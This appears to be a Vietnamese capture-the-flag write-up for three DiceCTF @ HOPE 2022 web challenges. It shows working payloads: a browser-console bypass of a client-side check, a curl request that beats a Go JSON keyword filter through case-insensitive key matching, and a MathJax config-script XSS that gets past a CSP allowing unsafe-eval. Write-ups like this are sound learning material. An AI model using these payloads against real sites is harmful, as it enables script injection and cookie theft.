## HOPE-CTF-2022

Link tất cả challenges [DiceCTF @ HOPE 2022](https://github.com/dicegang/hope-2022-challenges)

### flag-viewer

Bài này không filter ở server mà filter ở phía client side, ta có thể bypass bằng console.
```js
document.querySelector('input[name="user"]').value = 'admin';
document.querySelector('form').submit();
```

### Point
Bài này là một bài về golang.
Set up từ archive của `HOPE`:
```s
docker build -t point .
docker run --name point -d -p 5001:8081 imageID
```
Source:
```go
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

type importantStuff struct {
	Whatpoint string `json:"what_point"`
}

func main() {
	flag, err := os.ReadFile("flag.txt")
	if err != nil {
		panic(err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			fmt.Fprint(w, "Hello, world")
			return
		case http.MethodPost:
			body, err := io.ReadAll(r.Body)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if strings.Contains(string(body), "what_point") || strings.Contains(string(body), "\\") {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			var whatpoint importantStuff
			err = json.Unmarshal(body, &whatpoint)
			if err != nil {
				fmt.Fprintf(w, "Something went wrong")
				return
			}

			if whatpoint.Whatpoint == "that_point" {
				fmt.Fprintf(w, "Congrats! Here is the flag: %s", flag)
				return
			} else {
				fmt.Fprintf(w, "Something went wrong")
				return
			}
		default:
			fmt.Fprint(w, "Method not allowed")
			return
		}
	})

	log.Fatal(http.ListenAndServe(":8081", nil))

}
```

Giải thích về json trong golang: `https://viblo.asia/p/huong-dan-json-trong-golang-yMnKMzXjZ7P`

Đầu tiên có một struct có biến là `Whatpoint`, và nếu encode json thì `Whatpoint` sẽ mã hóa thành `what_point`
```go
type importantStuff struct {
	Whatpoint string `json:"what_point"`
}
```

Trong phương thức POST, nếu chứa request user gửi lên chứa `what_point`hay `\\` thì sẽ trả về `Something went wrong`
Sau đó nó thực hiện decode json body rồi lưu vào biến `whatpoint`
Nếu như decode ra được thuộc tính `whatpoint.Whatpoint`==`"that_point"` thì send flag.

Bây giờ ta cần phải làm sao để bypass hàm check `what_point`

Trong json.Unmarshal của golang, nó sẽ chấp nhận tên cả ở uppercase và lowercase.
Ví dụ:
```go
package main

import (
	"encoding/json"
	"fmt"
)

type importantStuff struct {
	Whatpoint string `json:"what_point"`
}

func newImportantStuff(str string) importantStuff {
	n := importantStuff{
		Whatpoint: str,
	}
	return n
}

func main() {
	js := newImportantStuff("that_point")
	byteArray, err := json.Marshal(js)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(byteArray))
	var whatpoint importantStuff
	jsonString := `{"WhAt_point":"that_point"}`//{"what_point":"that_point"}
	errr := json.Unmarshal([]byte(jsonString), &whatpoint)
	if errr != nil {
		panic(errr)
	}
	fmt.Println(whatpoint)
}
//return
//{"what_point":"that_point"}
//{that_point}
```
Payload: `curl -X POST -d '{"wHat_point":"that_point"}' 192.168.83.128:5001`
Hoặc với httpie: `http POST localhost:5001 <<< '{"wHat_point":"that_point"}'`
```s
HTTP/1.1 200 OK
Content-Length: 63
Content-Type: text/plain; charset=utf-8
Date: Thu, 30 Mar 2023 05:56:57 GMT

Congrats! Here is the flag: hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}
```

### MK

Build: `docker build -t mk .`

Run: `docker run -d -p 5001:3000 mk`


Trong source có sử dụng thư viện MathJax để render user input. Version là 2.7.9
`Content-Security-Policy`:
* script-src-attr 'none': Không cho sử dụng thuộc tính trên thẻ <script> trong HTML.
* script-src 'self' 'unsafe-eval': Chỉ cho tải src trong thẻ script cùng domain, và đặc biệt là nó cho phép thực thi mã tải từ thẻ script đó.

Trong web.js, nó sử dụng fastify api để lắng nghe và render (Với web này, mục đích chính của nó là tạo nội dung xong render.js sẽ fetch nó về). 

```js
fastify.get('/render', {
	schema: {
		query: {
			type: 'object',
			properties: {
				content: {
					type: 'string',
					maxLength: 1000
				}
			},
			required: ['content']
		}
	}
}, (req, res) => {
	res.type('text/html').send(md.render(req.query.content));
});
```
Nếu chúng ta truy cập vào /render?content=aaa thì aaa sẽ in ra ở màn hình bởi dòng `res.type('text/html').send(md.render(req.query.content));`.

Vậy là ở đây chúng ta có 2 nơi để cho input và render, 1 là ở trang chính và 2 là đưa content vào /render

Và ở đây lỗi nằm ở thư viện MathJax với type="text/x-mathjax-config", thư viện này nó để config cấu hình, ta có thể trigger được xss như sau:
```js
<script type="text/x-mathjax-config">alert(1)</script><script type="text/javascript" src="/MathJax/MathJax.js?config=TeX-MML-AM_CHTML"></script>
```

Cơ chế của nó là tải thư viện mathjax lên, và với route content policy có unsafe-eval thì `<script type="text/x-mathjax-config">alert(1)</script>` sẽ thực thi bởi thư viện MathJax.
Ví dụ như trang web của bạn cho phép tải script từ example.com, và nếu content policy được set là unsafe-eval thì nó sẽ thực thi những hàm ở bên trong example.com:
```js
<script src=example.com></script>
//Trang example.com có nội dung là alert(1)
```

Bây giờ ta chỉ cần send payload lấy cookie cho adminbot. Vì mình làm lại sau khi challenge đã diễn ra nên không có adminbot để send cookie.

Nói thêm một chút, nếu như chúng ta sửa content policy thành `script-src 'self' cdnjs.cloudflare.com 'unsafe-eval'` thì payload sau cũng sẽ trigger xss.
```s
http://192.168.83.128:5001/render?content=<script type="text/x-mathjax-config">alert(1)</script><script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script>
```